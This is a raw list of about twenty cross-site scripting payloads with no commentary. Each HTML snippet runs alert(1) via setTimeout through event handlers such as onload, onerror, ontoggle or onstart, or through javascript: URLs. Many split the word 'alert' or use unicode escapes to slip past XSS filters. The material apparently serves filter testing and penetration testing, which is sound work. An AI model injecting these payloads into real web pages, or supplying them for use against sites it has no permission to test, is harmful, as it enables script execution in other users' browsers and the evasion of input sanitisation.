```html
<svg onload="setTimeout('a\u006cert(1)',0)">
<iframe srcdoc="<img src='x' onerror='setTimeout(&#39;al&#39;+&#39;ert(1)&#39;,0)'>">
<math href="javascript:setTimeout('ale'+'rt(1)',5)"><mspace /></math>
<body onunload=setTimeout('al'+'ert(1)',0)>
<form><input type=image src onerror=setTimeout('al'+'ert(1)',0)></form>
<video><source onerror="setTimeout('al'+'ert(1)',0)"></video>
<embed src=javascript:setTimeout('ale'+'rt(1)',1)></embed>
<details open ontoggle="setTimeout('ale'+'rt(1)',0)"></details>
<marquee onstart=setTimeout('ale'+'rt(1)',0)></marquee>
<x onpointerenter=setTimeout('ale'+'rt(1)',0)></x>
```
<svg onload="setTimeout('alert(1)',1)">
<img src="x" onerror="setTimeout('alert(1)',1)">
<iframe onload="setTimeout(() => { alert(1); }, 1)">
<math href="javascript:setTimeout(`alert\u00281\u0029`,1)"/>
<video><source onerror="setTimeout(function(){alert(1)},1)">
<details open ontoggle="setTimeout('alert(1)',1)">
<body onload="setTimeout('alert`1`',1)">
<bgsound onload="setTimeout(() => alert(1), 1)">
<marquee onstart="setTimeout(()=>{alert(1)},1)">
<keygen autofocus onfocus="setTimeout('alert(1)',1)">
